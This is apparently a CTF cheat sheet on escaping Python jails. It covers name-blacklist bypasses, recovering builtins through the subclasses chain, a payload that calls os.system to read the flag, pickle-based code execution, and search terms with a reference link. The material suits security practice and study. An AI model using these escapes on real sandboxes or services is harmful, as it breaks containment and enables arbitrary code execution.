# Pyjail techniques

## Common styles
- Blacklist of names: `__import__`, `open`, `eval`, `exec`, `os`, `sys`, `subprocess`, `class`, `mro`, `base`.
- Restricted builtins, no underscores, length limits, one-liner, `eval(input())`, `exec(input())`, `pickle`, `marshal`.

## Key techniques
1. Attribute access without dots/spaces: use `getattr`, `__getattribute__`, `vars`, `dir`; string tricks to spell banned names.
2. Bypass underscore filter: `'__cl'+'ass__'`, `chr(95)`, `_` in unicode, `getattr(x, '__dict__'.replace('__','__'))`.
3. Builtins recovery: `().__class__.__base__.__subclasses__()` -> find `os._wrap_close`, `subprocess.Popen`, `warnings.catch_warnings`, `_sitebuiltins._Printer`.
4. Common payload:
   `().__class__.__base__.__subclasses__()[i].__init__.__globals__['system']('cat flag*')`
   or via `os` from `_wrap_close.__init__.__globals__`.
5. No builtins: `().__class__.__mro__[1].__subclasses__()` still works via object; use `[x for x in ... if ...]` to locate.
6. Eval with string only: encode payload in unicode escapes; `eval(input())` + `open('flag').read()`.
7. Restricted eval with `__builtins__` replaced: use `(lambda:...).__globals__`, or `[].__class__` chains.
8. `breakpoint()`/`help()`/`license()`/`credits()` (site helpers) to get an interactive shell or leak `_Printer` with builtins.
9. F-string / format string payloads: `f"{().__class__.__base__}"`.
10. `pickle`/`marshal`: arbitrary code execution via `__reduce__`.

## Tools
- Local Python to test payloads; `docker`/the challenge image; `ast` inspection.

## SEARCH
- "pyjail writeup", "python jail escape subclasses", "eval blacklist bypass CTF", "().__class__.__base__.__subclasses__ payload"

## References
- HackTricks Python jail: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html
